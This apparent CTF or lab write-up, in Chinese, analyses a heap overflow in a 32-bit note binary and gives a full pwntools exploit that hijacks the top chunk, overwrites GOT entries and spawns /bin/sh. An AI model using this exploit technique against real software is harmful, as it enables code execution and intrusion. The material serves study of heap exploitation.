# 漏洞利用文档

## 执行环境
基于exp脚本和调试记录分析：
- **二进制类型**：32位ELF可执行文件，动态链接
- **安全机制**：
  - No PIE：代码段和数据段地址固定（如0x804...）
  - 可能启用NX（不可执行栈），但通过GOT覆盖绕过
  - 栈保护状态未知，但利用聚焦堆操作
- **依赖库**：标准C库（libc），exp使用LibcSearcher动态解析libc版本
- **运行需求**：需要本地执行或远程连接，exp使用`process('./data/sample20')`启动

## 漏洞成因
### 关键结构体分析
- **堆块结构**：包含fd（前向指针）、bk（后向指针）等元数据，位于用户数据前
- **全局变量数组**：
  - `dword_804B120[10]`：笔记指针数组
  - `dword_804B0A0[10]`：笔记大小数组
  - `dword_804B0E0[10]`：笔记同步标志数组

### 漏洞分析
- **漏洞位置**：`sub_80487A1`函数中的`strcpy(v2, s)`
- **漏洞类型**：堆缓冲区溢出
- **根本原因**：
  - 在初始化阶段，`sub_80487A1`使用`strcpy`将栈缓冲区`s`（64字节）复制到堆分配的`v2`（64字节）
  - `strcpy`不检查边界，当输入超过64字节时，溢出覆盖相邻堆块的元数据（fd/bk指针）
  - 类似问题存在于`sub_804884E`的org/host输入中
- **触发路径**：通过连续堆溢出覆盖top chunk指针，实现任意地址分配

## 漏洞利用过程
### 内存变化关键步骤

| 步骤 | 操作描述 | 堆状态变化 | 数据段/GOT变化 | 利用效果 |
|------|----------|------------|----------------|----------|
| 1 | 输入64字节name溢出 | 堆块元数据被覆盖（fd/bk=0x61616161） | 无 | 泄漏堆地址(0x96ba008) |
| 2 | 输入org/host进一步溢出 | 主机名堆块fd设置为0xffffffff，top chunk被覆盖 | top chunk指向数据段(0x804b118) | 获得数据段分配能力 |
| 3 | 创建笔记(margin-20) | 分配失败但修改top chunk | top chunk移动到0x804b238 | 精确控制分配位置 |
| 4 | 创建4个0x40字节笔记 | 正常堆分配 | 指针数组部分覆盖，形成自引用 | 建立内存操纵基础 |
| 5 | 编辑笔记1设置指针 | 无直接变化 | 指针数组设置为[0x804b130,0x804b130,free_got,printf_got] | 构造任意读写原语 |
| 6 | 编辑笔记2覆盖GOT | 无直接变化 | free@got.plt被覆盖为puts@plt | 函数劫持准备 |
| 7 | 删除笔记3触发puts | 释放堆块 | 调用puts(printf@got)泄漏libc地址 | 获取libc基址 |
| 8 | 计算libc地址 | 无变化 | libc.address = printf_addr - libc.sym['printf'] | 定位system函数 |
| 9 | 编辑笔记1设置字符串 | 无直接变化 | 指针数组更新，0x804b130写入"/bin/sh" | 准备system参数 |
| 10 | 编辑笔记2覆盖GOT | 无直接变化 | free@got.plt被覆盖为system | 完成函数劫持 |
| 11 | 删除笔记0触发free | 释放堆块 | 调用system("/bin/sh") | 获取shell权限 |

### 内存布局演变
- **初始状态**：堆区(0x96ba000-0x96db000)，数据段(0x804b000-0x804c000)
- **利用后状态**：top chunk劫持到数据段，指针数组自引用，GOT表被覆盖
- **最终状态**：进程替换为/bin/dash，完整shell环境

## Exploit
```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample20')
p = process('./data/sample20')
free_got = elf.got['free']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
libc = elf.libc

def new_note(size, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'1')
    io.sendlineafter(b'Input the length of the note content:\n', str(size).encode())
    io.sendlineafter(b'Input the content:\n', content)
    io.recvline()

def edit_note(idx, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'3')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())
    io.sendlineafter(b'Input the new content:\n', content)
    io.recvline()

def del_note(idx, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'4')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())

# Step 1: 通过name输入堆溢出泄漏堆地址
p.sendafter(b'Input your name:\n', b'a' * 0x40)
p.recvuntil(b'a' * 0x40)
leak_heap_addr = u32(p.recvn(4))  # 泄漏的堆地址用于后续计算

# Step 2: 通过org/host输入覆盖top chunk到数据段
p.sendafter(b'Org:\n', b'b' * 0x40)
p.sendafter(b'Host:\n', p32(0xffffffff) + (0x40 - 4) * b'c')
p.recvuntil(b'OKay! Enjoy:)\n')

# Step 3: 计算偏移并创建笔记劫持top chunk
top_chunk_addr = leak_heap_addr + 0xd0
ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr
new_note(margin - 20, "")  # 分配使top chunk移动到数据段

# Step 4: 创建多个笔记建立内存布局
new_note(0x40, b'aa')
new_note(0x40, b'aa')
new_note(0x40, b'aa')
new_note(0x40, b'aa')

# Step 5: 编辑笔记1设置指针数组为自引用和GOT指针
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))

# Step 6: 编辑笔记2覆盖free@got.plt为puts@plt
edit_note(2, p32(puts_plt))

# Step 7: 删除笔记3触发puts泄漏printf地址
del_note(3)
msg = p.recvuntil(b'Delete success.\n')
printf_addr = u32(msg[:4])  # 泄漏的printf地址
libc.address = printf_addr - libc.sym['printf']  # 计算libc基址

# Step 9: 编辑笔记1更新指针数组并写入"/bin/sh"字符串
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

# Step 10: 编辑笔记2覆盖free@got.plt为system
edit_note(2, p32(libc.sym['system']))

# Step 11: 删除笔记0触发system("/bin/sh")获取shell
del_note(0)

# Step 12: 进入交互模式
p.interactive()
```

### 关键注释说明
- **堆地址泄漏**：利用strcpy溢出读取堆元数据中的地址
- **top chunk劫持**：通过溢出修改top chunk指针，实现数据段分配
- **指针数组操纵**：利用自引用指针实现任意内存读写
- **GOT覆盖**：分两步先覆盖为puts泄漏libc，再覆盖为system执行shell
- **参数准备**：在数据段写入"/bin/sh"字符串作为system参数
